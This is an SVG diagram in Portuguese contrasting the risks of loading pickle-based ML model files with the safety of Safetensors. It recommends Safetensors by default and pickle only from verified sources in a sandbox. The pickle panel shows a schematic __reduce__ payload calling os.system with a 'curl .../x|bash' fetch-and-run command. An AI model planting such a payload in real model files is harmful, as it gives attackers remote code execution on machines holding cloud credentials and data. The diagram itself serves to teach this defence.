<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 760 330" width="760" height="330" font-family="'DejaVu Sans', Arial, sans-serif">
  <style>
    .t{font-size:14px;font-weight:bold}
    .mono{font-family:'DejaVu Sans Mono',monospace;font-size:11.5px;fill:#2c3e50}
    .cap{font-size:11.5px;fill:#5d6d7e}
  </style>
  <defs>
    <marker id="ap" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0 0 L8 3 L0 6 Z" fill="#c0392b"/></marker>
    <marker id="as" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0 0 L8 3 L0 6 Z" fill="#16a085"/></marker>
  </defs>
  <rect width="760" height="330" fill="#ffffff"/>
  <text x="20" y="28" font-size="16" font-weight="bold" fill="#1a3a55">Pickle executa código ao carregar — Safetensors não</text>

  <!-- PICKLE -->
  <rect x="20" y="46" width="350" height="256" rx="10" fill="#fdf3f2" stroke="#c0392b" stroke-width="1.6"/>
  <text x="40" y="72" class="t" fill="#c0392b">.pkl  /  torch.load  /  joblib.load</text>

  <rect x="40" y="86" width="150" height="92" rx="6" fill="#fff" stroke="#c0392b"/>
  <text x="52" y="108" class="mono">dados do "modelo"</text>
  <text x="52" y="128" class="mono" fill="#c0392b">__reduce__:</text>
  <text x="52" y="146" class="mono" fill="#c0392b">os.system(</text>
  <text x="52" y="164" class="mono" fill="#c0392b"> "curl .../x|bash")</text>

  <line x1="190" y1="132" x2="236" y2="132" stroke="#c0392b" stroke-width="2" marker-end="url(#ap)"/>
  <rect x="240" y="100" width="112" height="66" rx="6" fill="#c0392b"/>
  <text x="296" y="128" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold">pickle.load()</text>
  <text x="296" y="148" text-anchor="middle" fill="#fbe6e3" font-size="10.5">= exec() disfarçado</text>

  <rect x="40" y="196" width="312" height="90" rx="8" fill="#fff" stroke="#c0392b" stroke-dasharray="4 3"/>
  <text x="56" y="218" class="t" fill="#c0392b" font-size="13">→ RCE na sua máquina de treino</text>
  <text x="56" y="242" class="cap">que costuma ter credenciais de nuvem,</text>
  <text x="56" y="260" class="cap">GPUs e acesso a dados.</text>
  <text x="56" y="280" class="cap" fill="#c0392b">Carregar ≠ seguro. É executar código alheio.</text>

  <!-- SAFETENSORS -->
  <rect x="390" y="46" width="350" height="256" rx="10" fill="#eafaf6" stroke="#16a085" stroke-width="1.6"/>
  <text x="410" y="72" class="t" fill="#16a085">.safetensors</text>

  <rect x="410" y="86" width="150" height="92" rx="6" fill="#fff" stroke="#16a085"/>
  <text x="422" y="110" class="mono">cabeçalho (JSON):</text>
  <text x="422" y="128" class="mono">formas e tipos</text>
  <text x="422" y="150" class="mono" fill="#16a085">tensores (pesos)</text>
  <text x="422" y="168" class="mono" fill="#16a085">= só números</text>

  <line x1="560" y1="132" x2="606" y2="132" stroke="#16a085" stroke-width="2" marker-end="url(#as)"/>
  <rect x="610" y="100" width="112" height="66" rx="6" fill="#16a085"/>
  <text x="666" y="124" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold">load_file()</text>
  <text x="666" y="144" text-anchor="middle" fill="#eafaf6" font-size="10.5">sem execução</text>
  <text x="666" y="160" text-anchor="middle" fill="#eafaf6" font-size="10.5">zero-copy/rápido</text>

  <rect x="410" y="196" width="312" height="90" rx="8" fill="#fff" stroke="#16a085" stroke-dasharray="4 3"/>
  <text x="426" y="218" class="t" fill="#16a085" font-size="13">→ seguro por design</text>
  <text x="426" y="242" class="cap">nenhuma instrução executável no arquivo.</text>
  <text x="426" y="262" class="cap" fill="#16a085">Política: Safetensors por padrão;</text>
  <text x="426" y="280" class="cap" fill="#16a085">Pickle só de origem verificada e em sandbox.</text>
</svg>
